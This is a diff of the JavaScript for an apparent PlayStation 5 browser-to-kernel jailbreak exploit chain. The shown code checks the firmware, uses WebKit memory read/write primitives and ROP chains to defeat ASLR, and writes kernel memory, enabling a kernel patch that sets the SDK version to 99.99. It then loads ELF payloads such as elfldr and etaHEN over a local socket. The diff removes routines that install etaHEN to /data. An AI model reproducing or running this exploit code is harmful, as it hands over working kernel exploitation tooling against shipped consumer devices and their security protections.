@@ -1,48 +1,3 @@
-// @ts-check
-
-/**
- * @typedef {Object} UserlandRW
- * @property {function(any, any): void} write8
- * @property {function(any, any): void} write4
- * @property {function(any, any): void} write2
- * @property {function(any, any): void} write1
- * @property {function(any): int64} read8
- * @property {function(any): number} read4
- * @property {function(any): number} read2
- * @property {function(any): number} read1
- * @property {function(any): int64} leakval
- */
-
-/**
- * @typedef {Object} WebkitPrimitives
- * @property {function(any, any): void} write8
- * @property {function(any, any): void} write4
- * @property {function(any, any): void} write2
- * @property {function(any, any): void} write1
- * @property {function(any): int64} read8
- * @property {function(any): number} read4
- * @property {function(any): number} read2
- * @property {function(any): number} read1
- * @property {function(any): int64} leakval
- * 
- * @property {function(any): void} pre_chain
- * @property {function(any): Promise<void>} launch_chain
- * @property {function(any): int64} malloc_dump
- * @property {function(any, number=): int64} malloc
- * @property {function(int64, number): Uint8Array} array_from_address
- * @property {function(any): int64} stringify
- * @property {function(any, number=): string} readstr
- * @property {function(int64, string): void} writestr
- * 
- * @property {int64} libSceNKWebKitBase
- * @property {int64} libSceLibcInternalBase
- * @property {int64} libKernelBase
- * 
- * @property {any[]} nogc
- * @property {any} syscalls
- * @property {any} gadgets 
- */
-
 if (!navigator.userAgent.includes('PlayStation 5')) {
     alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
     throw new Error("");
@@ -50,9 +5,7 @@ if (!navigator.userAgent.includes('PlayStation 5')) {
 
 const supportedFirmwares = ["4.00", "4.02", "4.03", "4.50", "4.51", "5.00", "5.02", "5.10", "5.50"];
 const fw_idx = navigator.userAgent.indexOf('PlayStation; PlayStation 5/') + 27;
-// @ts-ignore
 window.fw_str = navigator.userAgent.substring(fw_idx, fw_idx + 4);
-// @ts-ignore
 window.fw_float = parseFloat(fw_str);
 
 if (!supportedFirmwares.includes(fw_str)) {
@@ -64,14 +17,6 @@ if (!supportedFirmwares.includes(fw_str)) {
 let nogc = [];
 
 let worker = new Worker("rop_slave.js");
-
-/**
- * @param {UserlandRW|WebkitPrimitives} p 
- * @param {int64} buf 
- * @param {number} family 
- * @param {number} port 
- * @param {number} addr 
- */
 function build_addr(p, buf, family, port, addr) {
     p.write1(buf.add32(0x00), 0x10);
     p.write1(buf.add32(0x01), family);
@@ -79,19 +24,10 @@ function build_addr(p, buf, family, port, addr) {
     p.write4(buf.add32(0x04), addr);
 }
 
-/** 
- * @param {number} port
- * @returns {number}
- */
 function htons(port) {
     return ((port & 0xFF) << 8) | (port >>> 8);
 }
 
-/**
- * @param {UserlandRW|WebkitPrimitives} p 
- * @param {int64} libKernelBase 
- * @returns 
- */
 function find_worker(p, libKernelBase) {
     const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
     const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
@@ -107,10 +43,6 @@ function find_worker(p, libKernelBase) {
     throw new Error("failed to find worker.");
 }
 
-
-/**
- * @enum {number}
- */
 var LogLevel = {
     DEBUG: 0,
     INFO: 1,
@@ -124,11 +56,6 @@ var LogLevel = {
 
 let consoleElem = null;
 let lastLogIsTemp = false;
-/**
- * 
- * @param {string} string 
- * @param {LogLevel} level 
- */
 function log(string, level) {
     if (consoleElem === null) {
         consoleElem = document.getElementById("console");
@@ -140,8 +67,8 @@ function log(string, level) {
 
     if (isTemp && lastLogIsTemp) {
         const lastChild = consoleElem.lastChild;
-        lastChild.innerText = string;
-        lastChild.className = elemClass;
+        if (lastChild) lastChild.innerText = string;
+        if (lastChild) lastChild.className = elemClass;
         return;
     } else if (isTemp) {
         lastLogIsTemp = true;
@@ -165,11 +92,6 @@ const SOCK_DGRAM = 2;
 const IPPROTO_UDP = 17;
 const IPPROTO_IPV6 = 41;
 const IPV6_PKTINFO = 46;
-
-/**
- * @param {UserlandRW} p 
- * @returns {Promise<{p: WebkitPrimitives, chain: worker_rop}>}
- */
 async function prepare(p) {
     //ASLR defeat patsy (former vtable buddy)
     let textArea = document.createElement("textarea");
@@ -210,12 +132,6 @@ async function prepare(p) {
         ptr.backing = backing;
         return ptr;
     }
-
-    /**
-     * @param {number} sz 
-     * @param {number} type 
-     * @returns 
-     */
     function malloc(sz, type = 4) {
         let backing;
         if (type == 1) {
@@ -575,8 +491,8 @@ async function main(userlandRW, wkOnly = false) {
 
         // Patch PS4 SDK version
         if (typeof OFFSET_KERNEL_PS4SDK != 'undefined') {
-            //await krw.write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
-            //await log("Patched PS4 SDK version to 99.99", LogLevel.INFO);
+            await krw.write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
+            await log("Patched PS4 SDK version to 99.99", LogLevel.INFO);
         }
 
         ///////////////////////////////////////////////////////////////////////
@@ -815,63 +731,7 @@ async function main(userlandRW, wkOnly = false) {
 
         var load_local_elf = async function (filename) {
             try {
-                let total_sz;
-                
-                // For etaHEN.bin: try /data/ first, then fallback to host
-                if (filename === "etaHEN.bin") {
-                    const filepath = `/data/${filename}`;
-                    p.writestr(elf_store, filepath);
-                    
-                    const O_RDONLY = 0x0000;
-                    let fd = (await chain.syscall(SYS_OPEN, elf_store, O_RDONLY, 0)).low << 0;
-                    
-                    if (fd >= 0) {
-                        // Load from /data/
-                        await log("Loading etaHEN from /data/...", LogLevel.INFO);
-                        try {
-                            const stat_buf = p.malloc(0x200, 1);
-                            let stat_res = (await chain.syscall(SYS_FSTAT, fd, stat_buf)).low << 0;
-                            if (stat_res < 0) {
-                                throw new Error(`Failed to stat ${filepath}`);
-                            }
-                            
-                            const file_size = p.read8(stat_buf.add32(0x48)).low;
-                            await log(`File size: ${(file_size / 1024 / 1024).toFixed(2)} MB`, LogLevel.INFO);
-
-                            if (file_size > elf_store_size) {
-                                throw new Error(`File too large: ${file_size} bytes`);
-                            }
-
-                            let total_read = 0;
-                            let read_ptr = elf_store.add32(0);
-                            
-                            while (total_read < file_size) {
-                                let to_read = Math.min(0x100000, file_size - total_read);
-                                let bytes_read = (await chain.syscall(SYS_READ, fd, read_ptr, to_read)).low << 0;
-                                
-                                if (bytes_read <= 0) {
-                                    throw new Error(`Read failed at offset ${total_read}`);
-                                }
-                                
-                                total_read += bytes_read;
-                                read_ptr.add32inplace(bytes_read);
-                            }
-                            
-                            total_sz = total_read;
-                            await log(`Loaded ${(total_sz / 1024 / 1024).toFixed(2)} MB from /data/`, LogLevel.SUCCESS);
-                        } finally {
-                            await chain.syscall(SYS_CLOSE, fd);
-                        }
-                    } else {
-                        // Not in /data/, load from host
-                        await log("etaHEN not in /data/, loading from host...", LogLevel.WARN);
-                        total_sz = await load_payload_into_elf_store_from_local_file(filename);
-                    }
-                } else {
-                    // Load other files normally from host
-                    total_sz = await load_payload_into_elf_store_from_local_file(filename);
-                }
-                
+                let total_sz = await load_payload_into_elf_store_from_local_file(filename);
                 await parse_elf_store(total_sz);
                 await execute_elf_store();
                 return await wait_for_elf_to_exit();
@@ -884,96 +744,8 @@ async function main(userlandRW, wkOnly = false) {
         if (await load_local_elf("elfldr.elf") == 0) {
             await log(`elfldr listening on ${ip.ip}:9021`, LogLevel.INFO);
             await new Promise(resolve => setTimeout(resolve, 8000));
-            
-            // Load etaHEN from /data/ or host and send to port 9021
-            try {
-                const etahen_filepath = "/data/etaHEN.bin";
-                p.writestr(elf_store, etahen_filepath);
-                
-                const O_RDONLY = 0x0000;
-                let fd = (await chain.syscall(SYS_OPEN, elf_store, O_RDONLY, 0)).low << 0;
-                let total_sz = 0;
-                
-                if (fd >= 0) {
-                    // Load from /data/
-                    await log("Loading etaHEN from /data/...", LogLevel.INFO);
-                    try {
-                        const stat_buf = p.malloc(0x200, 1);
-                        let stat_res = (await chain.syscall(SYS_FSTAT, fd, stat_buf)).low << 0;
-                        if (stat_res < 0) {
-                            throw new Error(`Failed to stat ${etahen_filepath}`);
-                        }
-                        
-                        const file_size = p.read8(stat_buf.add32(0x48)).low;
-                        await log(`File size: ${(file_size / 1024 / 1024).toFixed(2)} MB`, LogLevel.INFO);
-
-                        if (file_size > elf_store_size) {
-                            throw new Error(`File too large: ${file_size} bytes`);
-                        }
-
-                        let total_read = 0;
-                        let read_ptr = elf_store.add32(0);
-                        
-                        while (total_read < file_size) {
-                            let to_read = Math.min(0x100000, file_size - total_read);
-                            let bytes_read = (await chain.syscall(SYS_READ, fd, read_ptr, to_read)).low << 0;
-                            
-                            if (bytes_read <= 0) {
-                                throw new Error(`Read failed at offset ${total_read}`);
-                            }
-                            
-                            total_read += bytes_read;
-                            read_ptr.add32inplace(bytes_read);
-                        }
-                        
-                        total_sz = total_read;
-                        await log(`Loaded ${(total_sz / 1024 / 1024).toFixed(2)} MB from /data/`, LogLevel.SUCCESS);
-                    } finally {
-                        await chain.syscall(SYS_CLOSE, fd);
-                    }
-                } else {
-                    // Not in /data/, load from host
-                    await log("etaHEN not in /data/, loading from host...", LogLevel.WARN);
-                    total_sz = await load_payload_into_elf_store_from_local_file("etaHEN.bin");
-                }
-                
-                // Send to port 9021 (elfldr) - inline code to avoid hoisting issues
-                await log("Sending etaHEN to port 9021...", LogLevel.INFO);
-                
-                let sock = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
-                if (sock <= 0) {
-                    throw new Error("Failed to create socket for port 9021");
-                }
-
-                const sock_addr = p.malloc(0x10, 1);
-                build_addr(p, sock_addr, AF_INET, htons(9021), 0x0100007F);
-
-                let connect_res = (await chain.syscall(SYS_CONNECT, sock, sock_addr, 0x10)).low << 0;
-                if (connect_res < 0) {
-                    await chain.syscall(SYS_CLOSE, sock);
-                    throw new Error("Failed to connect to port 9021 (is elfldr running?)");
-                }
-
-                let bytes_sent = 0;
-                let write_ptr = elf_store.add32(0x0);
-                while (bytes_sent < total_sz) {
-                    let send_res = (await chain.syscall(SYS_WRITE, sock, write_ptr, total_sz - bytes_sent)).low << 0;
-                    if (send_res <= 0) {
-                        await chain.syscall(SYS_CLOSE, sock);
-                        throw new Error("Failed to send etaHEN to port 9021");
-                    }
-
-                    bytes_sent += send_res;
-                    write_ptr.add32inplace(send_res);
-                }
-
-                await chain.syscall(SYS_CLOSE, sock);
-                await log(`EtaHEN Successfully Loaded via elfldr`, LogLevel.SUCCESS);
-                
-            } catch (error) {
-                await log(`Failed to load etaHEN: ${error}`, LogLevel.ERROR);
-            }
-            
+            await load_local_elf("etaHEN.bin");
+            await log(`EtaHEN Successfully Loaded`, LogLevel.INFO);
             EndTimer();
             is_elfldr_running = true;
         } else {
@@ -1165,9 +937,6 @@ async function main(userlandRW, wkOnly = false) {
         }
     }
 
-    /**
-     * @param {function(string): void} [log]
-     */
     async function delete_appcache(log = () => { }) {
         let user_home_entries = await ls("/user/home", elf_store);
         // if we're sandboxed we'll only have one
@@ -1231,76 +1000,6 @@ async function main(userlandRW, wkOnly = false) {
     }
     send_buffer_to_port.sock_addr_store = p.malloc(0x10, 1);
 
-    /**
-     * @param {function(string): void} [log]
-     */
-    async function download_etahen_to_data(log = () => { }) {
-        const etahen_url = "etaHEN.bin"; // Load from same host (GitHub Pages)
-        const etahen_path = "/data/etaHEN.bin";
-        
-        try {
-            await log("Downloading etaHEN.bin from host...");
-            const response = await fetch(etahen_url);
-            if (!response.ok) {
-                throw new Error(`HTTP ${response.status}`);
-            }
-            
-            const data = await response.arrayBuffer();
-            const byteArray = new Uint8Array(data);
-            await log(`Downloaded ${(byteArray.byteLength / 1024 / 1024).toFixed(2)} MB`);
-            
-            // Write to /data/etaHEN.bin
-            await log("Installing to /data/etaHEN.bin...");
-            p.writestr(elf_store, etahen_path);
-            
-            const O_WRONLY = 0x0001;
-            const O_CREAT = 0x0200;
-            const O_TRUNC = 0x0400;
-            let fd = (await chain.syscall(SYS_OPEN, elf_store, O_WRONLY | O_CREAT | O_TRUNC, 0x1B6)).low << 0;
-            
-            if (fd < 0) {
-                throw new Error("Failed to create /data/etaHEN.bin (permission denied?)");
-            }
-            
-            try {
-                // Copy data to elf_store first
-                if (elf_store.backing.BYTES_PER_ELEMENT == 1) {
-                    elf_store.backing.set(byteArray);
-                } else {
-                    throw new Error("Unsupported backing array type");
-                }
-                
-                // Write to file in chunks
-                let total_written = 0;
-                let write_ptr = elf_store.add32(0);
-                
-                while (total_written < byteArray.byteLength) {
-                    let to_write = Math.min(0x100000, byteArray.byteLength - total_written);
-                    let bytes_written = (await chain.syscall(SYS_WRITE, fd, write_ptr, to_write)).low << 0;
-                    
-                    if (bytes_written <= 0) {
-                        throw new Error(`Write failed at offset ${total_written}`);
-                    }
-                    
-                    total_written += bytes_written;
-                    write_ptr.add32inplace(bytes_written);
-                    
-                    await log(`Installing: ${((total_written / byteArray.byteLength) * 100).toFixed(1)}%`);
-                }
-                
-                await log(`etaHEN successfully installed to /data/! (${(total_written / 1024 / 1024).toFixed(2)} MB)`);
-                await log("You can now run etaHEN from /data/ (faster, no cache issues!)");
-                
-            } finally {
-                await chain.syscall(SYS_CLOSE, fd);
-            }
-            
-        } catch (error) {
-            await log(`Failed to download/install etaHEN: ${error}`);
-            throw error;
-        }
-    }
-
     sessionStorage.removeItem(SESSIONSTORE_ON_LOAD_AUTORUN_KEY);
 
     let ports = wkOnly ? "" : "9020";
@@ -1311,15 +1010,11 @@ async function main(userlandRW, wkOnly = false) {
         ports += "9021";
     }
 
-
-    // @ts-ignore
     document.getElementById('top-bar-text').innerHTML = `Listening on: <span class="fw-bold">${ip.ip}</span> (port: ${ports}) (${ip.name})`;
 
-    /** @type {Array<{payload_info: PayloadInfo, toast: HTMLElement}>} */
     let queue = [];
 
     window.addEventListener(MAINLOOP_EXECUTE_PAYLOAD_REQUEST, async function (event) {
-        /** @type {PayloadInfo} */
         let payload_info = event.detail;
         let toast = showToast(`${payload_info.displayTitle}: Waiting in queue...`, -1);
         queue.push({ payload_info, toast });
@@ -1333,14 +1028,12 @@ async function main(userlandRW, wkOnly = false) {
 
         if (queue.length > 0) {
 
-            let { payload_info, toast } = /** @type {{payload_info: PayloadInfo, toast: HTMLElement}} */ (queue.shift());
+            let { payload_info, toast } = (queue.shift());
 
             try {
                 if (payload_info.customAction) {
                     if (payload_info.customAction === CUSTOM_ACTION_APPCACHE_REMOVE) {
                         await delete_appcache(updateToastMessage.bind(null, toast));
-                    } else if (payload_info.customAction === "ETAHEN_INSTALL") {
-                        await download_etahen_to_data(updateToastMessage.bind(null, toast));
                     } else {
                         throw new Error(`Unknown custom action: ${payload_info.customAction}`);
                     }
@@ -1350,7 +1043,7 @@ async function main(userlandRW, wkOnly = false) {
 
                     if (!payload_info.toPort) {
                         if (wkOnly) {
-                            throw new Error(); // unreachable, in wkOnly theres only buttons for payloads with toPort
+                            throw new Error();
                         }
 
                         updateToastMessage(toast, `${payload_info.displayTitle}: Parsing...`);
@@ -1444,5 +1137,4 @@ async function main(userlandRW, wkOnly = false) {
 
 let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
-// @ts-ignore
 fwScript.setAttribute('src', `${window.fw_str}.js`);
